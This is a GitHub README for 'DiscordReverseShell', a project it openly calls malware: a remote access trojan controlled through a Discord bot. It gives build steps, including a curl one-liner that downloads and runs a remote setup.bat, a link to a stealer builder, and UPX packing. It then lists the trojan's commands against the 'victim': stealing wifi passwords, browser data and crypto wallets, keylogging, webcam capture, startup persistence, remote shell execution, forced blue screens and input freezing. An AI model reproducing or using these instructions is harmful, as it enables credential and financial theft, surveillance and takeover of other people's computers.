
# DiscordReverseShell
Malware in style of reverse shell whit discord as server

<p align="center">
    <span style="color: #fff; font-weight: bold;">DiscordReverseShell</span>
<span style="color: #fff; font-weight: bold;">v1.0.0</span>
       
## Usage

1. Download builder [here](https://github.com/Josakko/MultiStealerVirus/releases/) and UPX [here](https://upx.github.io/) and put it into `C:\UPX`.

2. Setup environment, download git to clone the repo automaticly:

       curl -sSfO "https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/setup.bat" && setup.bat

3. Go to the [discord developer portal](https://discord.com/developers/applications), sign in, and click `New Application`. Choose any name, click accept and create. Next go to the `Bot` section and click `Add Bot`. Click on `Reset Token` and click on `Copy` button.
       
- **IMPORTANT:** DO NOT share copyed token! Others can use this to control your bot!
       
 4. Go to [discord](https://discord.com/channels/@me), and create new server. Now `Right click` on that server and click on `Copy ID` (if you don't see that option navigate to `user settings` then `Advanced` and enable `Developer Mode`, now you can try to copy Id again).

5. Run `Builder.exe` that you downloaded in first step and make sure that you have `main.py`, `modules` folder etc. in `src` folder relative to the `Builder.exe`

6. Enter all required info that you will be promted to enter also make sure to have UPX installed or if you dont want to use it just select `y` for editing building options and disable usage of UPX there
       
7. Now you will have built exe in folder `src\dist\main.exe` witch is relative to the `Builder.exe` and also dont forget to invite the discord bot to the server that you just created!

8. When exe i ran new channel will be created in the discord server, once malware is ran you will be able to run command `help` to get full list of commands
       
       
Full list of commands for malware with description:

       
        help - Help command
        ping - Ping command
        sys - System information
        clipboard - Return clipboard content
        processes - Get all running processes
        cd - Change directory
        ls - List directory
        cwd - Get current working directory
        download <file> - Download file
        upload <link> - Upload file
        cmd <command> - Execute cmd command
        pw <command> - Execute powershell command
        run <file> - Run an file
        wifi - Return wifi passwords
        screenshot - Take a screenshot
        webcam - Get image of webcam
        bluescreen - Blue screen victim
        startup - Add to startup
        browser - Get browser data
        wallet - Get wallet information
        keylogger - Enable keylogger -- WIP -- !cant be stoped, only thru reboot or shutdown!
        freeze <1/0> - Freeze all inputs from keyboard and mouse
        !quit - Exit session without deleting all the data
        !exit - Exit session and delete all data


## Examples 

<p align="center">
  <img alt="issue" src="https://github.com/Josakko/DiscordReverseShell/blob/main/img/img0.png?raw=true" width="500px">
</p>


<p align="center">
  <img alt="issue" src="https://github.com/Josakko/DiscordReverseShell/blob/main/img/img2.png?raw=true" width="500px">
</p>

<p align="center">
  <img alt="issue" src="https://github.com/Josakko/DiscordReverseShell/blob/main/img/img1.png?raw=true" width="500px">
</p>

## Need Help?

If you need help contact me on my [discord server](https://discord.gg/xgET5epJE6).

## Contributors

Big thanks to all of the amazing people (only me) who have helped by contributing to this project!
